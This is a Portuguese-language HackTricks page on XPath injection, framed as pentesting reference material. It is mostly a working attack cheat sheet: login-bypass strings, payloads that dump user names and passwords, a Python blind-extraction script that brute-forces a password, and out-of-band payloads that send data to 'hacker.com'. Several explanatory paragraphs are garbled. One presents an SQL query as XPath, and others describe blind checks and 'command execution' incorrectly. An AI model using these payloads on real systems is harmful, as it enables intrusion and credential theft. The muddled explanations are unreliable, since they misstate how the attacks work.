# Inje√ß√£o de XPATH

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando os clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se a lenda do hacker web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## **Sintaxe B√°sica**

A inje√ß√£o de XPATH √© uma t√©cnica de ataque usada para explorar aplicativos que constroem consultas XPath (XML Path Language) a partir de entradas fornecidas pelo usu√°rio para consultar ou navegar em documentos XML.

Informa√ß√µes sobre como fazer consultas: [https://www.w3schools.com/xml/xpath\_syntax.asp](https://www.w3schools.com/xml/xpath\_syntax.asp)

### N√≥s

| Express√£o | Descri√ß√£o                                                                                           |
| ---------- | ----------------------------------------------------------------------------------------------------- |
| nodename   | Seleciona todos os n√≥s com o nome "nodename"                                                            |
| /          | Seleciona a partir do n√≥ raiz                                                                            |
| //         | Seleciona n√≥s no documento a partir do n√≥ atual que correspondem √† sele√ß√£o, n√£o importa onde estejam |
| .          | Seleciona o n√≥ atual                                                                              |
| ..         | Seleciona o pai do n√≥ atual                                                                |
| @          | Seleciona atributos                                                                                    |

### **Exemplos:**

| Express√£o de Caminho | Resultado                                                                                                                                 |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| bookstore       | Seleciona todos os n√≥s com o nome "bookstore"                                                                                            |
| /bookstore      | Seleciona o elemento raiz bookstore**Observa√ß√£o:** Se o caminho come√ßar com uma barra ( / ), ele sempre representa um caminho absoluto para um elemento! |
| bookstore/book  | Seleciona todos os elementos book que s√£o filhos de bookstore                                                                               |
| //book          | Seleciona todos os elementos book n√£o importa onde eles estejam no documento                                                                     |
| bookstore//book | Seleciona todos os elementos book que s√£o descendentes do elemento bookstore, n√£o importa onde eles estejam sob o elemento bookstore           |
| //@lang         | Seleciona todos os atributos com o nome lang                                                                                             |

### Predicados

| Express√£o de Caminho                     | Resultado                                                                                                                                                                                                                                                                                                         |
| ----------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /bookstore/book\[1]                 | <p>Seleciona o primeiro elemento book que √© filho do elemento bookstore.<strong>Observa√ß√£o:</strong> No IE 5,6,7,8,9 o primeiro n√≥ √©[0], mas de acordo com a W3C, √© [1]. Para resolver esse problema no IE, defina a SelectionLanguage como XPath:</p><p>Em JavaScript: xml.setProperty("SelectionLanguage","XPath");</p> |
| /bookstore/book\[last()]            | Seleciona o √∫ltimo elemento book que √© filho do elemento bookstore                                                                                                                                                                                                                                       |
| /bookstore/book\[last()-1]          | Seleciona o pen√∫ltimo elemento book que √© filho do elemento bookstore                                                                                                                                                                                                                               |
| /bookstore/book\[position()<3]      | Seleciona os dois primeiros elementos book que s√£o filhos do elemento bookstore                                                                                                                                                                                                                                 |
| //title\[@lang]                     | Seleciona todos os elementos title que possuem um atributo chamado lang                                                                                                                                                                                                                                               |
| //title\[@lang='en']                | Seleciona todos os elementos title que possuem um atributo "lang" com um valor de "en"                                                                                                                                                                                                                               |
| /bookstore/book\[price>35.00]       | Seleciona todos os elementos book do elemento bookstore que possuem um elemento price com um valor maior que 35.00                                                                                                                                                                                               |
| /bookstore/book\[price>35.00]/title | Seleciona todos os elementos title dos elementos book do elemento bookstore que possuem um elemento price com um valor maior que 35.00                                                                                                                                                                         |

### N√≥s Desconhecidos

| Coringa | Descri√ß√£o                  |
| -------- | ---------------------------- |
| \*       | Corresponde a qualquer n√≥ de elemento     |
| @\*      | Corresponde a qualquer n√≥ de atributo   |
| node()   | Corresponde a qualquer n√≥ de qualquer tipo |
### **Exemplos:**

| Express√£o de Caminho | Resultado                                                                 |
| -------------------- | ------------------------------------------------------------------------ |
| /livraria/\*         | Seleciona todos os n√≥s de elementos filhos do elemento livraria           |
| //\*                 | Seleciona todos os elementos no documento                                 |
| //titulo\[@\*]       | Seleciona todos os elementos de t√≠tulo que possuem pelo menos um atributo de qualquer tipo |

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando seus clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se uma lenda hacker web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## Exemplo
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
<name>pepe</name>
<password>peponcio</password>
<account>admin</account>
</user>
<user>
<name>mark</name>
<password>m12345</password>
<account>regular</account>
</user>
<user>
<name>fino</name>
<password>fino2</password>
<account>regular</account>
</user>
</data>
```
### Acessar as informa√ß√µes

XPath Injection is a technique used to exploit vulnerabilities in web applications that use XPath queries to retrieve data from XML databases. By manipulating the input parameters of the XPath query, an attacker can modify the query's logic and gain unauthorized access to sensitive information.

To access the information, an attacker needs to identify a vulnerable input field that is used in an XPath query. This can typically be found in search forms, login pages, or any other functionality that involves querying XML databases.

Once a vulnerable input field is identified, the attacker can start injecting malicious XPath expressions. These expressions are used to modify the original query and retrieve additional information that was not intended to be disclosed.

For example, consider a search form that uses an XPath query to retrieve user information from an XML database. The query may look like this:

```xml
//users/user[name='John']
```

By injecting a malicious expression, such as `' or 1=1 or ''='`, the attacker can modify the query to retrieve all user information:

```xml
//users/user[name='John' or 1=1 or ''='']
```

This modified query will return all user information, regardless of the input provided.

To prevent XPath Injection attacks, it is important to properly validate and sanitize user input before using it in XPath queries. Input validation should include checking for special characters and ensuring that the input conforms to the expected format.

Additionally, using parameterized queries or prepared statements can help protect against XPath Injection attacks. These techniques ensure that user input is treated as data and not as part of the query logic, preventing attackers from modifying the query structure.

By understanding and mitigating XPath Injection vulnerabilities, developers can protect their web applications from unauthorized access to sensitive information.
```
All names - [pepe, mark, fino]
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name

All values - [pepe, peponcio, admin, mark, ...]
//user/node()
//user/child::node()


Positions
//user[position()=1]/name #pepe
//user[last()-1]/name #mark
//user[position()=1]/child::node()[position()=2] #peponcio (password)

Functions
count(//user/node()) #3*3 = 9 (count all values)
string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
```
### Identificar e roubar o esquema

XPath Injection is a technique used to exploit vulnerabilities in web applications that use XPath queries to retrieve data from XML databases. By manipulating the input parameters of the XPath query, an attacker can modify the query to retrieve sensitive information or perform unauthorized actions.

To identify and steal the schema using XPath Injection, follow these steps:

1. **Identify the vulnerable parameter**: Start by identifying the input parameter that is used in the XPath query. This can usually be found in the URL, form fields, or cookies.

2. **Determine the XPath query structure**: Analyze the XPath query structure to understand how it retrieves data from the XML database. This will help you craft a malicious query to steal the schema.

3. **Craft a malicious XPath query**: Modify the input parameter value to inject a malicious XPath query. The goal is to retrieve the schema information from the XML database.

4. **Observe the response**: Submit the modified request and observe the response. If the response contains the schema information, you have successfully stolen the schema.

By stealing the schema, an attacker can gain valuable insights into the structure and organization of the XML database. This information can be used to further exploit the system and extract sensitive data.

It is important to note that XPath Injection can have serious consequences, including unauthorized access to sensitive information and potential data breaches. Therefore, it is crucial for developers to implement proper input validation and sanitization techniques to prevent XPath Injection attacks.
```python
and count(/*) = 1 #root
and count(/*[1]/*) = 2 #count(root) = 2 (a,c)
and count(/*[1]/*[1]/*) = 1 #count(a) = 1 (b)
and count(/*[1]/*[1]/*[1]/*) = 0 #count(b) = 0
and count(/*[1]/*[2]/*) = 3 #count(c) = 3 (d,e,f)
and count(/*[1]/*[2]/*[1]/*) = 0 #count(d) = 0
and count(/*[1]/*[2]/*[2]/*) = 0 #count(e) = 0
and count(/*[1]/*[2]/*[3]/*) = 1 #count(f) = 1 (g)
and count(/*[1]/*[2]/*[3]/[1]*) = 0 #count(g) = 0

#The previous solutions are the representation of a schema like the following
#(at this stage we don't know the name of the tags, but jus the schema)
<root>
<a>
<b></b>
</a>
<c>
<d></d>
<e></e>
<f>
<h></h>
</f>
</c>
</root>

and name(/*[1]) = "root" #Confirm the name of the first tag is "root"
and substring(name(/*[1]/*[1]),1,1) = "a" #First char of name of tag `<a>` is "a"
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105 #Firts char of tag `<b>`is codepoint 105 ("i") (https://codepoints.net/)

#Stealing the schema via OOB
doc(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
```
## Bypass de Autentica√ß√£o

### **Exemplo de consultas:**
```
string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
$q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]';
```
### **Bypassando OR em usu√°rio e senha (mesmo valor em ambos)**

Quando um aplicativo web utiliza a t√©cnica de XPath para consultar um banco de dados XML, √© poss√≠vel explorar uma vulnerabilidade conhecida como inje√ß√£o de XPath. Essa vulnerabilidade ocorre quando um invasor consegue inserir c√≥digo XPath malicioso em um campo de entrada, levando o aplicativo a executar consultas n√£o intencionais no banco de dados.

Uma t√©cnica comum de inje√ß√£o de XPath √© a utiliza√ß√£o do operador OR para contornar a verifica√ß√£o de usu√°rio e senha. Normalmente, o aplicativo verifica se o valor inserido no campo de usu√°rio √© igual ao valor inserido no campo de senha. No entanto, ao injetar uma express√£o XPath que utiliza o operador OR, √© poss√≠vel fazer com que o aplicativo aceite qualquer valor inserido, desde que o usu√°rio e a senha sejam iguais.

Aqui est√° um exemplo de como explorar essa vulnerabilidade:

```xml
<user>admin' or '1'='1</user>
<password>admin' or '1'='1</password>
```

Nesse exemplo, estamos inserindo o valor `'admin' or '1'='1'` tanto no campo de usu√°rio quanto no campo de senha. Como a express√£o `'1'='1'` √© sempre verdadeira, o aplicativo ir√° autenticar o usu√°rio, independentemente do valor inserido.

√â importante ressaltar que a inje√ß√£o de XPath pode ter consequ√™ncias graves, como a obten√ß√£o de acesso n√£o autorizado a informa√ß√µes sens√≠veis ou a execu√ß√£o de comandos maliciosos no servidor. Portanto, √© fundamental que os desenvolvedores implementem medidas de seguran√ßa adequadas para mitigar essa vulnerabilidade, como a valida√ß√£o e sanitiza√ß√£o correta dos dados de entrada.
```
' or '1'='1
" or "1"="1
' or ''='
" or ""="
string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())

Select account
Select the account using the username and use one of the previous values in the password field
```
### **Explorando a inje√ß√£o de nulo**

A inje√ß√£o de nulo √© uma t√©cnica comum usada para explorar vulnerabilidades em aplicativos da web que usam consultas XPath. Essa t√©cnica envolve a manipula√ß√£o de par√¢metros de entrada para inserir uma sequ√™ncia de caracteres nula (NULL) na consulta XPath, o que pode levar a resultados inesperados ou at√© mesmo √† execu√ß√£o de comandos maliciosos.

#### **Identificando uma vulnerabilidade de inje√ß√£o de nulo**

Para identificar uma vulnerabilidade de inje√ß√£o de nulo, voc√™ precisa encontrar um ponto de entrada onde os dados do usu√°rio s√£o usados em uma consulta XPath. Isso pode ser um campo de entrada em um formul√°rio da web ou um par√¢metro em uma URL.

Uma vez identificado o ponto de entrada, voc√™ pode come√ßar a testar a vulnerabilidade inserindo uma sequ√™ncia de caracteres nula (NULL) como parte dos dados de entrada. Se a aplica√ß√£o retornar um resultado inesperado ou exibir um comportamento anormal, √© prov√°vel que haja uma vulnerabilidade de inje√ß√£o de nulo.

#### **Explorando a vulnerabilidade de inje√ß√£o de nulo**

Uma vez identificada a vulnerabilidade de inje√ß√£o de nulo, voc√™ pode come√ßar a explor√°-la para obter informa√ß√µes sens√≠veis ou executar comandos maliciosos. Aqui est√£o algumas t√©cnicas comuns usadas para explorar essa vulnerabilidade:

1. **Obten√ß√£o de informa√ß√µes sens√≠veis**: voc√™ pode usar a inje√ß√£o de nulo para extrair informa√ß√µes sens√≠veis do aplicativo, como nomes de usu√°rio, senhas ou dados confidenciais.

2. **Execu√ß√£o de comandos maliciosos**: ao explorar a inje√ß√£o de nulo, voc√™ pode inserir comandos maliciosos na consulta XPath para executar a√ß√µes indesejadas no servidor, como excluir arquivos ou obter acesso n√£o autorizado.

#### **Preven√ß√£o de inje√ß√£o de nulo**

Para prevenir a inje√ß√£o de nulo em aplicativos da web, √© importante seguir as pr√°ticas recomendadas de seguran√ßa, como:

- **Valida√ß√£o de entrada**: sempre valide e sanitize os dados de entrada antes de us√°-los em consultas XPath.

- **Uso de par√¢metros preparados**: em vez de concatenar diretamente os dados de entrada em uma consulta XPath, use par√¢metros preparados para evitar a inje√ß√£o de nulo.

- **Restri√ß√£o de privil√©gios**: limite os privil√©gios do usu√°rio do aplicativo para minimizar o impacto de uma poss√≠vel inje√ß√£o de nulo.

Ao implementar essas pr√°ticas de seguran√ßa, voc√™ pode reduzir significativamente o risco de uma vulnerabilidade de inje√ß√£o de nulo em seus aplicativos da web.
```
Username: ' or 1]%00
```
### **Duplo OU no nome de usu√°rio ou na senha** (√© v√°lido com apenas 1 campo vulner√°vel)

IMPORTANTE: Observe que a **"e" √© a primeira opera√ß√£o realizada**.
```
Bypass with first match
(This requests are also valid without spaces)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
string(//user[name/text()='' or true() or '' and password/text()='']/account/text())

Select account
'or string-length(name(.))<10 or' #Select account with length(name)<10
'or contains(name,'adm') or' #Select first account having "adm" in the name
'or contains(.,'adm') or' #Select first account having "adm" in the current value
'or position()=2 or' #Select 2¬∫ account
string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())

Select account (name known)
admin' or '
admin' or '1'='2
string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
```
## Extra√ß√£o de strings

A sa√≠da cont√©m strings e o usu√°rio pode manipular os valores para realizar buscas:
```
/user/username[contains(., '+VALUE+')]
```

```
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')]/../*[3][text()!=(' #All the passwords
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```
### **Explora√ß√£o Cega**

### **Obter o comprimento de um valor e extra√≠-lo por meio de compara√ß√µes:**

A inje√ß√£o de XPath cega √© uma t√©cnica usada para explorar vulnerabilidades de inje√ß√£o de XPath em um aplicativo da web. Com essa t√©cnica, √© poss√≠vel obter o comprimento de um valor espec√≠fico e extra√≠-lo por meio de compara√ß√µes.

Para realizar essa explora√ß√£o, voc√™ pode usar express√µes XPath que retornam um resultado booleano com base em uma compara√ß√£o. Por exemplo, voc√™ pode usar a express√£o `substring(string-length(/path/to/value), 1, 1) = 'a'` para verificar se o primeiro caractere do valor √© igual a 'a'. Se a express√£o retornar verdadeiro, significa que o primeiro caractere √© 'a'. Caso contr√°rio, voc√™ pode tentar com outros caracteres at√© encontrar o correto.

Atrav√©s desse processo de compara√ß√£o, √© poss√≠vel determinar o comprimento do valor, caractere por caractere. Voc√™ pode repetir esse processo para extrair todo o valor desejado.

√â importante ressaltar que a inje√ß√£o de XPath cega deve ser realizada com cautela, pois pode causar danos ao aplicativo da web. Portanto, √© recomend√°vel obter permiss√£o legal antes de realizar qualquer teste de penetra√ß√£o.
```bash
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''=' #True if length equals 4
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''=' #True is first equals "a"

substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)

... and ( if ( $employee/role = 2 ) then error() else 0 )... #When error() is executed it rises an error and never returns a value
```
### **Exemplo em Python**
```python
import requests, string

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30):
r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i))
if ("TRUE_COND" in r.text):
l = i
break
print("[+] Password length: " + str(l))
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i))
for al in alphabet:
r = requests.get("http://example.com?action=user&userid=2 and substring(password,"+str(i)+",1)="+al)
if ("TRUE_COND" in r.text):
flag += al
print("[+] Flag: " + flag)
break
```
### Ler arquivo

A inje√ß√£o de XPath √© uma t√©cnica de ataque que permite que um invasor leia arquivos arbitr√°rios no servidor. Essa t√©cnica √© poss√≠vel quando um aplicativo web n√£o valida corretamente os dados de entrada fornecidos pelo usu√°rio antes de construir uma consulta XPath.

#### Como funciona a inje√ß√£o de XPath?

A inje√ß√£o de XPath ocorre quando um invasor manipula os dados de entrada para criar uma consulta XPath maliciosa. Essa consulta √© ent√£o enviada ao servidor, que a executa sem validar ou sanitizar os dados de entrada. Como resultado, o invasor pode obter acesso a informa√ß√µes confidenciais armazenadas em arquivos no servidor.

#### Exemplo de inje√ß√£o de XPath

Considere o seguinte trecho de c√≥digo em um aplicativo web vulner√°vel:

```python
username = request.getParameter("username")
query = "SELECT * FROM users WHERE username = '" + username + "'"
result = executeQuery(query)
```

Nesse exemplo, o valor fornecido pelo usu√°rio para o par√¢metro "username" √© diretamente concatenado √† consulta XPath sem valida√ß√£o adequada. Um invasor pode explorar essa vulnerabilidade fornecendo um valor malicioso para o par√¢metro "username" e manipulando a consulta XPath para ler arquivos arbitr√°rios.

Por exemplo, se o invasor fornecer o seguinte valor para o par√¢metro "username":

```
' or 1=1 or username='admin' or 'a'='a
```

A consulta XPath resultante ser√°:

```
SELECT * FROM users WHERE username = '' or 1=1 or username='admin' or 'a'='a'
```

Essa consulta retornar√° todos os registros da tabela "users", permitindo que o invasor acesse informa√ß√µes confidenciais.

#### Preven√ß√£o de inje√ß√£o de XPath

Para prevenir a inje√ß√£o de XPath, √© importante validar e sanitizar corretamente os dados de entrada fornecidos pelo usu√°rio. Isso pode ser feito utilizando consultas parametrizadas ou fun√ß√µes de escape espec√≠ficas da linguagem de programa√ß√£o utilizada.

Al√©m disso, √© recomend√°vel restringir as permiss√µes de acesso aos arquivos no servidor e implementar mecanismos de controle de acesso adequados para proteger informa√ß√µes confidenciais.
```python
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```
## Explora√ß√£o OOB

Out-of-Band (OOB) √© uma t√©cnica de explora√ß√£o usada em ataques de inje√ß√£o XPath. Nesse tipo de ataque, o invasor injeta c√≥digo malicioso em uma aplica√ß√£o web que utiliza XPath para consultar um banco de dados XML. A inje√ß√£o XPath ocorre quando o invasor manipula os par√¢metros de entrada da consulta XPath para obter informa√ß√µes sens√≠veis ou executar comandos indesejados.

A explora√ß√£o OOB √© uma varia√ß√£o da inje√ß√£o XPath que permite ao invasor extrair dados do servidor web por meio de solicita√ß√µes HTTP externas. Isso √© poss√≠vel porque o servidor web pode ser configurado para fazer solicita√ß√µes externas para recuperar dados de um recurso remoto, como um servidor DNS ou um servidor de arquivos.

Para explorar essa vulnerabilidade, o invasor injeta c√≥digo XPath malicioso que faz com que o servidor web fa√ßa uma solicita√ß√£o HTTP para um servidor controlado pelo invasor. O servidor controlado pelo invasor registra as solicita√ß√µes recebidas e, assim, o invasor pode extrair informa√ß√µes sens√≠veis do servidor web.

A explora√ß√£o OOB pode ser realizada de v√°rias maneiras, como:

- Inje√ß√£o de c√≥digo XPath malicioso que faz com que o servidor web fa√ßa uma solicita√ß√£o HTTP para um servidor controlado pelo invasor.
- Manipula√ß√£o dos par√¢metros de entrada da consulta XPath para obter informa√ß√µes sens√≠veis.
- Execu√ß√£o de comandos indesejados no servidor web.

Para se proteger contra ataques de inje√ß√£o XPath e explora√ß√£o OOB, √© importante validar e sanitizar corretamente os par√¢metros de entrada da consulta XPath. Al√©m disso, √© recomend√°vel restringir as permiss√µes do servidor web para evitar que ele fa√ßa solicita√ß√µes externas n√£o autorizadas.
```python
doc(concat("http://hacker.com/oob/", RESULTS))
doc(concat("http://hacker.com/oob/", /Employees/Employee[1]/username))
doc(concat("http://hacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))

#Instead of doc() you can use the function doc-available
doc-available(concat("http://hacker.com/oob/", RESULTS))
#the doc available will respond true or false depending if the doc exists,
#user not(doc-available(...)) to invert the result if you need to
```
### Ferramenta autom√°tica

{% embed url="https://xcat.readthedocs.io/" %}

## Refer√™ncias

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20injection" %}

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando seus clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se a lenda dos hackers web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
